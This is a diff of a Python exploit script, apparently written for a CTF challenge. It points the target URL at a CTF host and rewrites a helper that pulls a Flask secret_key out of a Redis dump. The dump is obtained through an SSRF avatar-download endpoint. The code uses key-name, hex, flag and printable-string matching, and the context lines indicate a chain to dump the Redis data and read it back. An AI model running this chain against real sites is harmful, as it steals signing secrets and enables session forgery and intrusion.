@@ -14,7 +14,7 @@ import pickle
 import requests
 
 # ============== 配置区 ==============
-TARGET_URL = "http://target.com"  # 目标站点URL，需要修改
+TARGET_URL = "http://b291fcc6-d953-4fa2-a1a7-1f37c3594fb1.64.dart.ccsssc.com"  # CTF靶机地址
 SSRF_ENDPOINT = "/api/avatar/download"  # SSRF漏洞端点
 LOGIN_ENDPOINT = "/api/login"
 REGISTER_ENDPOINT = "/api/register"
@@ -242,61 +242,101 @@ def exploit_save_and_read_dump(session, redis_config):
 def extract_secret_key_from_dump(dump_content):
     """
     从Redis dump文件中提取Flask secret_key
-    secret_key通常是64字符的十六进制字符串
+    支持多种格式：RDB二进制、纯文本、各种键名
     """
     if not dump_content:
+        print("[-] dump内容为空")
         return None
 
     secret_key = None
-    after_key = None
 
     # 将内容转为bytes
     if isinstance(dump_content, str):
-        dump_bytes = dump_content.encode('utf-8', errors='ignore')
+        dump_bytes = dump_content.encode('latin-1', errors='ignore')
     else:
         dump_bytes = dump_content
 
-    # 方法1：匹配64位十六进制字符串
-    hex_pattern = re.compile(r'[0-9a-fA-F]{64}')
-    hex_matches = hex_pattern.findall(dump_bytes.decode('utf-8', errors='ignore'))
+    print(f"[*] dump文件大小: {len(dump_bytes)} 字节")
+    print(f"[*] dump前200字节(hex): {dump_bytes[:200].hex()}")
+    print(f"[*] dump可打印内容: {dump_bytes[:500]}")
 
-    if hex_matches:
-        print(f"[+] 在dump中找到 {len(hex_matches)} 个可能的hex字符串")
-        for match in hex_matches[:5]:
-            secret_key = match
-            print(f"[+] 找到hex字符串: {secret_key}, 长度: {len(secret_key)}")
-            break
+    # 常见的secret_key键名列表
+    key_names = [
+        b'app:secret_key',
+        b'secret_key',
+        b'SECRET_KEY',
+        b'flask_secret',
+        b'session_secret',
+        b'app_secret',
+    ]
 
-    # 方法2：查找app:secret_key键值对
-    if not secret_key and b'app:secret_key' in dump_bytes:
-        print("[+] 找到 'app:secret_key' 键")
-        idx = dump_bytes.find(b'app:secret_key')
+    # 方法1：搜索所有可能的键名
+    for key_name in key_names:
+        if key_name in dump_bytes:
+            print(f"[+] 找到键名: {key_name.decode()}")
+            idx = dump_bytes.find(key_name)
 
-        if idx != -1:
-            key_total_length = len(b'app:secret_key')
-            after_key = dump_bytes[idx + key_total_length:idx + key_total_length + 100]
+            # RDB格式中，值通常在键名后面，可能有长度前缀字节
+            # 提取键名后200字节进行分析
+            after_key = dump_bytes[idx:idx + 200]
+            print(f"[*] 键名位置 {idx}，后续200字节:")
+            print(f"    Hex: {after_key.hex()}")
+            print(f"    Raw: {after_key}")
 
-            print("[*] 键后100字节原始内容:")
-            print(after_key)
+            # 在键名后查找可打印字符串（跳过键名本身）
+            value_start = len(key_name)
+            value_area = after_key[value_start:value_start + 100]
 
-            # 尝试匹配64字符hex字符串
-            hex_match = re.search(rb'[0-9a-fA-F]{64}', after_key)
-            if hex_match:
-                secret_key = hex_match.group().decode('utf-8')
-                print(f"[+] 从键后提取到secret_key: {secret_key}")
-            else:
-                print("[-] 未提取到符合格式的密钥")
-                visible_content = after_key.decode('utf-8', errors='ignore')
-                print(f"[*] 键后可见字符: {visible_content}")
+            # 提取连续的可打印ASCII字符
+            printable = b''
+            for i, b in enumerate(value_area):
+                if 32 <= b <= 126:  # 可打印ASCII
+                    printable += bytes([b])
+                elif len(printable) > 10:  # 已经收集到足够长的字符串
+                    break
+                else:
+                    printable = b''  # 重置
 
-    # 方法3：尝试base64格式
-    if not secret_key and after_key:
-        base64_pattern = re.compile(rb'[A-Za-z0-9+/]{40,}={0,2}')
-        base64_match = re.search(base64_pattern, after_key)
+            if len(printable) >= 16:
+                secret_key = printable.decode('ascii')
+                print(f"[+] 提取到secret_key: {secret_key}")
+                return secret_key
 
-        if base64_match:
-            secret_key = base64_match.group(0).decode('utf-8')
-            print(f"[+] 提取到可能的base64格式secret_key: {secret_key[:30]}...")
+    # 方法2：匹配各种长度的十六进制字符串 (16-128字符)
+    hex_patterns = [
+        rb'[0-9a-fA-F]{64}',  # 64字符 (256位)
+        rb'[0-9a-fA-F]{32}',  # 32字符 (128位)
+        rb'[0-9a-fA-F]{48}',  # 48字符
+        rb'[0-9a-fA-F]{40}',  # 40字符 (SHA1)
+    ]
+
+    for pattern in hex_patterns:
+        matches = re.findall(pattern, dump_bytes)
+        if matches:
+            print(f"[+] 找到 {len(matches)} 个匹配 {pattern.decode()} 的字符串")
+            for match in matches[:3]:
+                print(f"    候选: {match.decode()}")
+            # 返回第一个匹配
+            secret_key = matches[0].decode()
+            return secret_key
+
+    # 方法3：查找dart{}格式的flag（可能secret_key就是flag）
+    flag_match = re.search(rb'dart\{[^}]+\}', dump_bytes)
+    if flag_match:
+        flag = flag_match.group().decode()
+        print(f"[+] 直接找到flag: {flag}")
+        return flag
+
+    # 方法4：提取所有长度>=16的可打印字符串
+    print("[*] 尝试提取所有可打印字符串...")
+    printable_strings = re.findall(rb'[\x20-\x7e]{16,}', dump_bytes)
+    if printable_strings:
+        print(f"[+] 找到 {len(printable_strings)} 个可打印字符串:")
+        for s in printable_strings[:10]:
+            print(f"    {s.decode()}")
+        # 返回最长的一个作为候选
+        longest = max(printable_strings, key=len)
+        secret_key = longest.decode()
 
     return secret_key
 
